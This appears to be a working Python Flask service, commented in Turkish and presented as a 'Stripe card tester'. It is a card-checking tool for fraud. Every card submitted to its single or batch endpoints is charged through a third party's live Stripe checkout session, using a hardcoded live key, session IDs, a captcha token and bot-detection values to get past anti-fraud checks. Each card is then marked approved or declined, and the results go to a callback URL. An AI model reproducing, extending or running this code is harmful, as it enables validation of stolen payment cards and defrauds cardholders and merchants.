import requests
import json
import uuid
import time
import hashlib
import threading
import queue
from urllib.parse import urlencode
from datetime import datetime
from flask import Flask, request, jsonify
from flask_cors import CORS
from typing import Dict, List, Optional, Tuple
import logging

# ========== LOGGING KURULUMU ==========
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# ========== KONFİGÜRASYON ==========
CONFIG = {
    'max_workers': 5,  # Aynı anda çalışacak max thread sayısı
    'request_timeout': 30,  # İstek timeout süresi
    'rate_limit_delay': 2,  # Kart başına bekleme süresi
    'max_queue_size': 100,  # Max kuyruk boyutu
    'webhook_url': None,  # Sonuçları göndermek için webhook URL
}

# ========== STRIPE PAYMENT TESTER ==========
class StripeCardTester:
    def __init__(self, stripe_key: str = None):
        """Stripe kart test sınıfı"""
        self.stripe_key = stripe_key or "pk_live_51DyOClAPjNCDE0D2wWe6NaCuxHaXC44GEMeKO4fjjFbrv3F0NPCDEklx4ulzHEO3qE9bPvamVZ2uYQWp3wzLsWUA00ccNFXty4"
        
        self.headers = {
            'accept': 'application/json',
            'accept-language': 'tr-AZ,tr;q=0.9,az-AZ;q=0.8,az;q=0.7,en-US;q=0.6,en;q=0.5',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://checkout.stripe.com',
            'priority': 'u=1, i',
            'referer': 'https://checkout.stripe.com/',
            'sec-ch-ua': '"Chromium";v="142", "Google Chrome";v="142", "Not_A Brand";v="99"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36',
        }
        
        # Session IDs
        self.session_ids = {
            'client_session_id': '8d333670-e641-4998-a510-afea3a3ae883',
            'checkout_session_id': 'cs_live_b1OlkZSP9YilIx3ywbgEGDhfu1ZKXWZhIyH2w18szA5ReJg4mFf1gBqgG4',
            'checkout_config_id': '0d9a394e-50ec-4579-8350-01e938d3f61a'
        }
        
        # Fixed values
        self.pxvid = 'fc1aa832-f3dc-11f0-82c7-a1f81d547055'
        self.pxcts = 'fc1aafc0-f3dc-11f0-82c7-c1843af888d0'
    
    def get_passive_captcha_token(self) -> str:
        """Passive captcha token al"""
        return "P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwZCI6MCwiZXhwIjoxNzY4NzY1NDg4LCJjZGF0YSI6IktlQjhYWWxGdVpZYXdBNmVlcFo5YllsTVNIZUZPajhJTlgzWlhST2pnY0lEYmxHaTFLRFBjclgrUEtVejl5NU9rekNRMVZYWDFLd3RTcmMrVHg2dnJ2RGVHWE1GM2JzUnpGOFdZalJnK3VxRVpwYURhVi9OUlJJVXY3c05GZjljUEQ2R3U0aFZLYU5vVHhsVXZ6M0xpRUw0RWY5MGxNVjNtbng4TUw1eU11bE9rN3I0LytlMjJZVk9SZ1ZwcmtYdUljYUpSdC9oK1NIb3RkazFtTFRkU0FtWDk3eGFWNkJYamNkbXFHN0JWWlY5WFZzSjJaMmErd1VCeVR1azhjdnlQSFNNcjR2RkN6UGR4cHppVmVPcXYxZTZnK1Q3QXNnZW1KbC9uU1VSWG9lR1JuSEFWbnQ3d2R4SmxmMnAyT2ZVNjlXTVBFbnF1NGs0cmMrMGV5Zk1sYTFPWnpuNnZGZ0p4K2ZnQjVhTUE5MEpxZjJYNlcwYjNrcUxMLzRrU2RUdW9oZGdjRTRMN1A5NFlHYkNCdDlsQVM3bk9nd3lnYlZENnFGaGZpNmJSL3lDL3dhUTNqZkZSekpZSkNESHN5YnM2VXZrL29keVZzcjgiLCJwYXNza2V5IjoiTy9FMDlIQkVwY0hrT1FEWnViZlFqR09ncnYweUNCblBlcjdaSDJPQjdMcXh5bjByMkRTTGtPL3ppNUhFRXdMeThwMkNYTHBPTSttM3dyR0QwZ0hwUTIvT1pPQzN5UzNUWGdnNUdrbUFaNEtvYm1rdGlBeWpZdC8xT2NzZG04TnNRZmFBdUFPSGVQTlM1dW1pTjdBYk5KL0pUdFJZeDU5WSt1VzgzcU01NHN3VGQxaVBZbzRFY0lISGpGM00vZjVJcytKVkxFaVFNekVqMjlaakdRY2JjTExWYXRFeDBvNkl2NEcvVkxCQ0d6enpFWkw0N3FnK092MU9sV0dKbkhOdnNKZ2pvd3VpSndCV3dIMmtMUG1FYjhQeWdsakNoVjhhYkt0bWV5aEF4dVM0M3dvNkxBcXRLSnVpOFo0cUxYbldtVGZUcWM4clZoRmNxc2EwaGFqekFYNVpQV2E5c2NRUUI0eUVpOGJoTU9PL1ZpV0VWYTFGcEh5SjFKYlMvbHhtaVVHVm5mekdBa2FHMGpOc1dNd3VRaU92OStRVTBMRkVBdDBQY2I2Y1JtaTA0dkFvS01XclIrRS9uekIxTS9uUVN6LzV0bFFPVm1KV0RWZFB4elczcG4wL1ZLZjFZZ2JiU1Ewa0VKRFVvM0xYU250VVdLUXU4V2dDbXdCOGVxTW5aN3JzdEt5c3dtdktXc0YyU09vRTFEem9XbUpublNnOGU5SDhRWUl1KzdxM3NacFJ3bXRuNFU4Zk51eUliaXB0NkUzaU5rKzlpaGtVSjB2V0s0dU5ZN1RjaUtveDcvRFVoT3Iyc2ViMUp0V04vRkJYWjZzWEQ1cS9OdTU4SHlBeVZWZ3RsaTBPZTFYRUJaUGcvN1I2TkRmbUFHN1FZY0dUVDJrRk1BdE9PTGwwWjlzaWFpejJ1aTlKQzVNTFY5d3E1bGdvL0EwQldjVVNxNGtNTER5c0UveXVLaVVkczlqMmxVaW80am8vbkMzams0SGtjckdUVU1tOHpWRklpb0FFdjJrcmNwZmk4NWtUSHlTcDhPMFMvU21PSmFuZCsrYjVkSnoyb3lrTnY3Z01kd0N3NkhzQ2phWVhFajVJUnF0M2tZVXdFVXNWZUhtZ3V2cmNpTjV6aVo2U2RDUkRDYXVFUWlyVWhlWVNOd2VmMFFQaWpMcDFrZm5tKzUvT2UzL2M3RFF5NDMzMlhZT2hCSUFoMHg4cGJZVGRiOVN6QjQ2WEZEdVVtUEpiN240eGg3TkxaNzBTVFVQS05wS1dPRmkwSlUvZXhiVTdaL2x4cUxQcW9YWlJWUzZlSmZiZkJ0Um00M0Y0YVhWSnhTQ0hmMEZCR2R1VGtTWERBc0xBTVBxRTVncG1pMjh1NDVBdUI1UDJpcW1KNDJYa2lQMWo3SlFrY0pHb1VnTFQxeWc0SWk1R3kxWXQwTy82KzI2ME1xYUlvdGxJSjBoV1c1bENlMS9NZ2VzTG52WTFyNnZHNTZvSzJiSVlsNlZuczYrUHE1SUE5Qy9WSkorb1dGTTlOY28xdGF6V1RGOWd3dUtWVWE2NTBnYTQwd2VtZzV3T3ZoWTlDVFBZSkFneGV2M0FhMTNHbGRNOXJlWWpldm03Vk1FMGxjU1V1b2Vna3h0bVdCNXg5U0xMM0JnQkRhVTBJMTEzSTJkMk1IaG1ha1pzaEZ4eitNUUduODF6UmNSNitvT2NmWFZ4L2I5eXNXQXFjcmpiNXZaaWJUWitnMVZBMGdTL2JrckZsQjhzcXQrMTQ0TTBtNzVOY1JsSmdFcXdxTCtZRFVDTmpJZHNMK0FiaXNubGlBUEFnazhITVpRa0FYQXQ5UlVKdmVQUWY0RS8rK1BtdUJIRHFjRG1rZVRMVi9EN0hzQTA5eXVxeDdWc0dLdGM3VUJKbEQrYVp6UlFWdGlLYnZzM3VUV3lBNDJtakRSL1Ria3h1ZThKc0E4R2FtaFFZRXBodzI2cHJkR1VVV1dlUDdGakJDUnJhWmVFajNoZnozR2RSQVdGTTA3VG1XZXRoZEtFRnUvMmc4TmpONENHeDgyZU5hQmNIanBsMEhiUGlXUWNDdXlXenVCOGZ6RmIxRVFLUGY0OUpMTVpHUGprNzlQS1hzcWtrSk1uREljMEZXMmZDZEJpRUV2NFNQWFVUWGFPemlCRDBCT296d0dYeEdxMUtLYm1HTUpHQm9GQU9ld0NlTHV2NTNNZFpKblhoQ3RnbU9FOEhmZC9ZZEFLQmpWc1R4dVM4S3pvWXdOYTJmOU13dHdZWmRiU1Q0enFIdkgxSHZrRk9CYmJLZW9RTEt1L0UzbzZ2Ynh3NHlDZVNiaHVKYTBUeUlUQXVCK0gzUU9WT2QxMEt5SitvVGwyQ2hZV0ZBanJ4UUNWR08rTmJxZFY1d1R6RWNLcEdqdThWTUtzNStTY0NkQXBLMzQ2alh2SjR5cWhkN04yQ1doWjl3dE91TjNUYzlVTjhpOVVFaGtjL3RjUUY1MVd5cGNPN0pUU0UwNGdOd2g1RkpuZFRZbDVNc3NVaUlMaEtiMzMvM25icnJ1SjhqcVdYbzZpTkJkUTZwUkVJVFkzMVV2c2huazg4VXppMjBKaCt4elpQUEU4cC93VDdMTzM5cndUUHVMeUtKNENjNUU3K0gwd0ZmK05xc3RvUml4WVF1N2VwZlFmSXlVekxTRm9iV2JyWlBKa2VjSnBhbytzRnFoWDVrL1ZMZz09Iiwia3IiOiI0NDNkZjEwNSIsInNoYXJkX2lkIjozMzk1MTAzMDN9.5vnkAexY5Adr4PSiNdp-NVJ41TlquJRcJMSDJlYZPZI"
    
    def create_payment_method(self, card_data: Dict) -> Tuple[bool, Optional[str], Optional[Dict]]:
        """Payment method oluştur"""
        try:
            guid = str(uuid.uuid4()).replace('-', '') + "3ed280"
            muid = str(uuid.uuid4()).replace('-', '') + "73b4e8"
            sid = str(uuid.uuid4()).replace('-', '') + "d83e6b"
            
            payment_data = {
                'type': 'card',
                'card[number]': card_data['number'],
                'card[cvc]': card_data['cvc'],
                'card[exp_month]': card_data['exp_month'],
                'card[exp_year]': card_data['exp_year'],
                'billing_details[name]': card_data.get('name', 'John Doe'),
                'billing_details[email]': card_data.get('email', 'test@example.com'),
                'billing_details[address][country]': card_data.get('country', 'US'),
                'guid': guid,
                'muid': muid,
                'sid': sid,
                'key': self.stripe_key,
                'payment_user_agent': 'stripe.js/83a1f53796; stripe-js-v3/83a1f53796; checkout',
                'client_attribution_metadata[client_session_id]': self.session_ids['client_session_id'],
                'client_attribution_metadata[checkout_session_id]': self.session_ids['checkout_session_id'],
                'client_attribution_metadata[merchant_integration_source]': 'checkout',
                'client_attribution_metadata[merchant_integration_version]': 'hosted_checkout',
                'client_attribution_metadata[payment_method_selection_flow]': 'automatic',
                'client_attribution_metadata[checkout_config_id]': self.session_ids['checkout_config_id']
            }
            
            response = requests.post(
                'https://api.stripe.com/v1/payment_methods',
                headers=self.headers,
                data=urlencode(payment_data),
                timeout=CONFIG['request_timeout']
            )
            
            if response.status_code == 200:
                data = response.json()
                return True, data.get('id'), data
            else:
                error_msg = self._extract_error(response)
                return False, error_msg, None
                
        except Exception as e:
            return False, str(e), None
    
    def confirm_payment(self, payment_method_id: str) -> Tuple[bool, str, Optional[Dict]]:
        """Ödemeyi onayla"""
        try:
            confirm_data = {
                'eid': 'NA',
                'payment_method': payment_method_id,
                'expected_amount': '700',
                'last_displayed_line_item_group_details[subtotal]': '700',
                'last_displayed_line_item_group_details[total_exclusive_tax]': '0',
                'last_displayed_line_item_group_details[total_inclusive_tax]': '0',
                'last_displayed_line_item_group_details[total_discount_amount]': '0',
                'last_displayed_line_item_group_details[shipping_rate_amount]': '0',
                'expected_payment_method_type': 'card',
                'guid': str(uuid.uuid4()).replace('-', '') + "3ed280",
                'muid': str(uuid.uuid4()).replace('-', '') + "73b4e8",
                'sid': str(uuid.uuid4()).replace('-', '') + "d83e6b",
                'key': self.stripe_key,
                'version': '83a1f53796',
                'init_checksum': 'tCgsjhhPaVmn9nM8O7G8Z62A5GHVskWW',
                'js_checksum': 'qto~d%5En0%3DQU%3Eazbu%5DboRY%5Dl%3B%5Dam%3B+R%5C%60L%3C%5C_n%3C%5D%26on%5Bc%5Da%60%25o%3FU%5E%60w',
                'px3': '32d874c8a6e1c236571dd86456963d3b25d974ee62355ecfdbf7592b5d57a481:wtD0CF%2B2kmLY2gs5X7YlG96h%2Bm1l%2BviISibWz1t7yYOW50sKM%2FWf2XB4FpFkXXAmxXw%2BwSG%2FQSkvfzXCEQ9pdg%3D%3D%3A1000%3ArHjO2cb3P210J3yIpROZK3EaE2Gz0AHqdXLVWYDjvz5A6qSR%2BvMoMn9fIHLCbjJXq2mqVcFkZV9%2FgmlfMFhpLSa5Tq0PpF1fzKGjA42jZ7JQaAeLNblf42CbSyOjri9LsulBG1k8%2FsngB3W07%2F7H%2FC6r6nm5wWc4FJtWk5PUdL9bai2jt4%2BJ3hR6vim3hb5rTNH8Wsz0MMcigiXjhwfQWuyPUfnOeF2ofpqm2Z6FBUYKuDw1kE3Ce8LGf7LBp%2FaN0UlniyaQg9iaSJBhLSImuxjXAHccB%2BXedRnguw3Q5q2fsw8Wd13vmF5WCOXTtEZ6Ok7mhdMi5%2BBNUsylsdN8%2BLjqW8exdmt9ohj460RN8qBiq4Rwa7aCDs6bN3qM4F8%2FnFxRk0h3GMIYnQywzP3%2BX8Xb8aZLdCKvccFFNkdQDxGzCvSr8DI2MsPuMC8eotGig2NBntpumejqp2cSv%2BV6zhaZgz6BdV0cJw268%2BSpdNO8s1C1Xqkvi6xNDOv7hhakcPRlqSa%2BMBXo1UK8ZxPuwidzHXVUPYbaYrGG1EMiPatz7V2YoB4f%2FUvZ5X9gS40F',
                'pxvid': self.pxvid,
                'pxcts': self.pxcts,
                'passive_captcha_token': self.get_passive_captcha_token(),
                'passive_captcha_ekey': '',
                'rv_timestamp': 'qto%3En%3CQ%3DU%26CyY%26%60%3EX%5Er%3CYNr%3CYN%60%3CY_C%3CY_C%3CY%5E%60zY_%60%3CY%5En%7BU%3Eo%26U%26Cy%5B_evYRX%23YuTCX%26P%24YOQuY%26P%26e%26L%3EYR%5CD%5BRouYuL%3Bd_%24yeO%3Crd%26P%3Dd%5En%7BU%3Ee%26U%26CyX%26%24vd_orYO%24rX%26ov%5BOn%26dbexYu%5CDYR%5CC%5BRn%25dRer%5B_P%26e%3DnDY_P%25Y%3D%5C%23Y%26YvdbL%25X_P%3Bd%26UsX%3DYuXuT%3CeOX%23Y%5Eo%3FU%5E%60w',
                'referrer': 'https://boostmyfollowers.xyz',
                'client_attribution_metadata[client_session_id]': self.session_ids['client_session_id'],
                'client_attribution_metadata[checkout_session_id]': self.session_ids['checkout_session_id'],
                'client_attribution_metadata[merchant_integration_source]': 'checkout',
                'client_attribution_metadata[merchant_integration_version]': 'hosted_checkout',
                'client_attribution_metadata[payment_method_selection_flow]': 'automatic',
                'client_attribution_metadata[checkout_config_id]': self.session_ids['checkout_config_id']
            }
            
            url = f"https://api.stripe.com/v1/payment_pages/{self.session_ids['checkout_session_id']}/confirm"
            response = requests.post(
                url,
                headers=self.headers,
                data=urlencode(confirm_data),
                timeout=CONFIG['request_timeout']
            )
            
            if response.status_code == 200:
                data = response.json()
                status = data.get('status', 'unknown')
                
                if status == 'succeeded':
                    return True, "APPROVED - Ödeme başarılı", data
                elif status == 'requires_payment_method':
                    return False, "DECLINED - Kart geçersiz", data
                elif status == 'requires_action':
                    return False, "3D_SECURE - 3D Secure gerekiyor", data
                else:
                    return False, f"DECLINED - Durum: {status}", data
            else:
                error_msg = self._extract_error(response)
                return False, f"DECLINED - {error_msg}", None
                
        except Exception as e:
            return False, f"ERROR - {str(e)}", None
    
    def test_card(self, card_data: Dict) -> Dict:
        """Kartı test et ve sonuç döndür"""
        card_number = card_data['number']
        masked_card = f"{card_number[:6]}******{card_number[-4:]}"
        
        logger.info(f"Kart test başlatıldı: {masked_card}")
        
        result = {
            'card': masked_card,
            'status': 'processing',
            'message': '',
            'timestamp': datetime.now().isoformat(),
            'details': {},
            'bin': card_number[:6],
            'last4': card_number[-4:],
            'test_id': str(uuid.uuid4())
        }
        
        try:
            # 1. Payment method oluştur
            success_pm, pm_id_or_error, pm_data = self.create_payment_method(card_data)
            
            if not success_pm:
                result['status'] = 'declined'
                result['message'] = f"PAYMENT_METHOD_ERROR - {pm_id_or_error}"
                result['details'] = {'stage': 'payment_method_creation', 'error': pm_id_or_error}
                return result
            
            result['details']['payment_method_id'] = pm_id_or_error
            
            # Bekleme
            time.sleep(1)
            
            # 2. Ödemeyi onayla
            success_confirm, confirm_message, confirm_data = self.confirm_payment(pm_id_or_error)
            
            if success_confirm:
                result['status'] = 'approved'
                result['message'] = confirm_message
            else:
                result['status'] = 'declined'
                result['message'] = confirm_message
            
            if confirm_data:
                result['details']['confirm_response'] = confirm_data
            
            logger.info(f"Kart test tamamlandı: {masked_card} - {result['status']}")
            
        except Exception as e:
            result['status'] = 'error'
            result['message'] = f"SYSTEM_ERROR - {str(e)}"
            logger.error(f"Kart test hatası: {masked_card} - {str(e)}")
        
        return result
    
    def _extract_error(self, response) -> str:
        """Hata mesajını çıkar"""
        try:
            error_data = response.json()
            error_type = error_data.get('error', {}).get('type', 'unknown')
            error_msg = error_data.get('error', {}).get('message', 'Bilinmeyen hata')
            return f"{error_type}: {error_msg}"
        except:
            return f"HTTP {response.status_code}"

# ========== KART TEST YÖNETİCİSİ ==========
class CardTestManager:
    def __init__(self):
        self.tester = StripeCardTester()
        self.task_queue = queue.Queue(maxsize=CONFIG['max_queue_size'])
        self.results = {}
        self.workers = []
        self.is_running = False
        
    def start_workers(self):
        """Worker thread'leri başlat"""
        if not self.is_running:
            self.is_running = True
            for i in range(CONFIG['max_workers']):
                worker = threading.Thread(target=self._worker_thread, daemon=True, name=f"Worker-{i}")
                worker.start()
                self.workers.append(worker)
            logger.info(f"{CONFIG['max_workers']} worker thread başlatıldı")
    
    def stop_workers(self):
        """Worker thread'leri durdur"""
        self.is_running = False
        logger.info("Worker thread'ler durduruluyor...")
    
    def add_card_test(self, card_data: Dict, callback_url: str = None) -> str:
        """Kart testi kuyruğa ekle"""
        if self.task_queue.full():
            raise Exception("Kuyruk dolu, daha sonra tekrar deneyin")
        
        test_id = str(uuid.uuid4())
        
        task = {
            'test_id': test_id,
            'card_data': card_data,
            'callback_url': callback_url,
            'added_at': datetime.now().isoformat(),
            'status': 'queued'
        }
        
        self.task_queue.put(task)
        self.results[test_id] = task
        
        logger.info(f"Yeni test kuyruğa eklendi: {test_id}")
        
        return test_id
    
    def get_result(self, test_id: str) -> Optional[Dict]:
        """Test sonucunu getir"""
        return self.results.get(test_id)
    
    def _worker_thread(self):
        """Worker thread fonksiyonu"""
        while self.is_running:
            try:
                task = self.task_queue.get(timeout=1)
                
                test_id = task['test_id']
                card_data = task['card_data']
                
                # Status güncelle
                self.results[test_id]['status'] = 'processing'
                self.results[test_id]['started_at'] = datetime.now().isoformat()
                
                # Kartı test et
                result = self.tester.test_card(card_data)
                
                # Sonuçları kaydet
                self.results[test_id].update({
                    'status': 'completed',
                    'completed_at': datetime.now().isoformat(),
                    'result': result
                })
                
                # Callback URL'e gönder
                if task.get('callback_url'):
                    self._send_callback(task['callback_url'], result)
                
                # Rate limiting
                time.sleep(CONFIG['rate_limit_delay'])
                
                self.task_queue.task_done()
                
            except queue.Empty:
                continue
            except Exception as e:
                logger.error(f"Worker thread hatası: {str(e)}")
    
    def _send_callback(self, url: str, result: Dict):
        """Sonucu callback URL'e gönder"""
        try:
            response = requests.post(
                url,
                json=result,
                timeout=10
            )
            logger.info(f"Callback gönderildi: {url} - Status: {response.status_code}")
        except Exception as e:
            logger.error(f"Callback gönderme hatası: {str(e)}")

# ========== FLASK API ==========
app = Flask(__name__)
CORS(app)  # CORS aktif et

# Global manager
test_manager = CardTestManager()

@app.route('/')
def index():
    """Ana sayfa"""
    return jsonify({
        'service': 'Stripe Card Test API',
        'version': '1.0.0',
        'endpoints': {
            '/test': 'Kart test et (POST)',
            '/status/<test_id>': 'Test durumunu getir (GET)',
            '/stats': 'İstatistikleri getir (GET)',
            '/batch': 'Toplu kart test et (POST)'
        }
    })

@app.route('/test', methods=['POST'])
def test_card():
    """Tek kart test et"""
    try:
        data = request.json
        
        if not data:
            return jsonify({
                'success': False,
                'error': 'JSON verisi gerekli'
            }), 400
        
        required_fields = ['number', 'exp_month', 'exp_year', 'cvc']
        missing_fields = [field for field in required_fields if field not in data]
        
        if missing_fields:
            return jsonify({
                'success': False,
                'error': f'Eksik alanlar: {", ".join(missing_fields)}'
            }), 400
        
        # Callback URL (opsiyonel)
        callback_url = data.get('callback_url')
        
        # Test ID al
        test_id = test_manager.add_card_test(data, callback_url)
        
        return jsonify({
            'success': True,
            'test_id': test_id,
            'message': 'Kart test kuyruğa eklendi',
            'status_url': f'/status/{test_id}'
        })
        
    except Exception as e:
        logger.error(f"Test endpoint hatası: {str(e)}")
        return jsonify({
            'success': False,
            'error': str(e)
        }), 500

@app.route('/status/<test_id>', methods=['GET'])
def get_status(test_id):
    """Test durumunu getir"""
    try:
        result = test_manager.get_result(test_id)
        
        if not result:
            return jsonify({
                'success': False,
                'error': 'Test ID bulunamadı'
            }), 404
        
        response = {
            'success': True,
            'test_id': test_id,
            'status': result.get('status', 'unknown'),
            'added_at': result.get('added_at'),
            'started_at': result.get('started_at'),
            'completed_at': result.get('completed_at')
        }
        
        if 'result' in result:
            response['result'] = result['result']
        
        return jsonify(response)
        
    except Exception as e:
        return jsonify({
            'success': False,
            'error': str(e)
        }), 500

@app.route('/batch', methods=['POST'])
def batch_test():
    """Toplu kart test et"""
    try:
        data = request.json
        
        if not data or 'cards' not in data:
            return jsonify({
                'success': False,
                'error': 'cards array gerekli'
            }), 400
        
        cards = data['cards']
        callback_url = data.get('callback_url')
        
        if not isinstance(cards, list):
            return jsonify({
                'success': False,
                'error': 'cards bir array olmalı'
            }), 400
        
        if len(cards) > 50:
            return jsonify({
                'success': False,
                'error': 'Maksimum 50 kart test edilebilir'
            }), 400
        
        test_ids = []
        for card_data in cards:
            required_fields = ['number', 'exp_month', 'exp_year', 'cvc']
            if all(field in card_data for field in required_fields):
                test_id = test_manager.add_card_test(card_data, callback_url)
                test_ids.append(test_id)
        
        return jsonify({
            'success': True,
            'message': f'{len(test_ids)} kart kuyruğa eklendi',
            'test_ids': test_ids,
            'total': len(test_ids)
        })
        
    except Exception as e:
        return jsonify({
            'success': False,
            'error': str(e)
        }), 500

@app.route('/stats', methods=['GET'])
def get_stats():
    """İstatistikleri getir"""
    try:
        results = test_manager.results
        
        total = len(results)
        queued = len([r for r in results.values() if r.get('status') == 'queued'])
        processing = len([r for r in results.values() if r.get('status') == 'processing'])
        completed = len([r for r in results.values() if r.get('status') == 'completed'])
        
        approved = 0
        declined = 0
        for r in results.values():
            if 'result' in r:
                if r['result'].get('status') == 'approved':
                    approved += 1
                elif r['result'].get('status') == 'declined':
                    declined += 1
        
        return jsonify({
            'success': True,
            'stats': {
                'total_tests': total,
                'queued': queued,
                'processing': processing,
                'completed': completed,
                'approved': approved,
                'declined': declined,
                'success_rate': (approved / completed * 100) if completed > 0 else 0,
                'queue_size': test_manager.task_queue.qsize()
            }
        })
        
    except Exception as e:
        return jsonify({
            'success': False,
            'error': str(e)
        }), 500

# ========== WEBHOOK TEST ENDPOINT ==========
@app.route('/webhook/test', methods=['POST'])
def webhook_test():
    """Webhook test endpoint (callback için örnek)"""
    data = request.json
    logger.info(f"Webhook alındı: {json.dumps(data, indent=2)}")
    return jsonify({'success': True, 'message': 'Webhook alındı'})

# ========== BAŞLATMA ==========
if __name__ == "__main__":
    # Worker thread'leri başlat
    test_manager.start_workers()
    
    print("=" * 60)
    print("STRIPE KART TEST API - ÇALIŞIYOR")
    print("=" * 60)
    print(f"API URL: http://localhost:5000")
    print("\nENDPOINTLER:")
    print("  GET  /              - Ana sayfa")
    print("  POST /test          - Tek kart test et")
    print("  GET  /status/<id>   - Test durumunu getir")
    print("  POST /batch         - Toplu kart test et")
    print("  GET  /stats         - İstatistikleri getir")
    print("  POST /webhook/test  - Webhook test (callback)")
    print("\nÖRNEK İSTEK:")
    print('''
curl -X POST http://localhost:5000/test \\
  -H "Content-Type: application/json" \\
  -d '{
    "number": "4242424242424242",
    "exp_month": "12",
    "exp_year": "2025",
    "cvc": "123",
    "name": "John Doe",
    "email": "test@example.com",
    "callback_url": "http://your-webhook-url.com/callback"
  }'
    ''')
    print("=" * 60)
    
    try:
        app.run(host='0.0.0.0', port=5000, debug=False, threaded=True)
    except KeyboardInterrupt:
        print("\nAPI durduruluyor...")
        test_manager.stop_workers()
